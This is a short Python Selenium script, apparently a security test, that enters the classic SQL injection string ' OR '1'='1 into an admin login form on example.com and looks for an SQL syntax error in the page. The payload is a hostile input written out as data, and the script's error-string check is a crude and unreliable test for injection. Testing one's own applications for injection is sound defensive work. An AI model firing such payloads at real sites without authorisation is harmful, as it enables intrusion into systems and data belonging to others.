# Testing SQL injections through input fields

from selenium import webdriver

payload = "' OR '1'='1"
driver = webdriver.Firefox()
driver.get("http://example.com/admin")
username_input = driver.find_element_by_name("username")
password_input = driver.find_element_by_name("password")
username_input.send_keys(payload)
password_input.submit()

if "SQL Syntax" in driver.page_source:
    print("SQL injection vulnerability found!")
else:
    print("No SQL injection vulnerability found.")

driver.quit()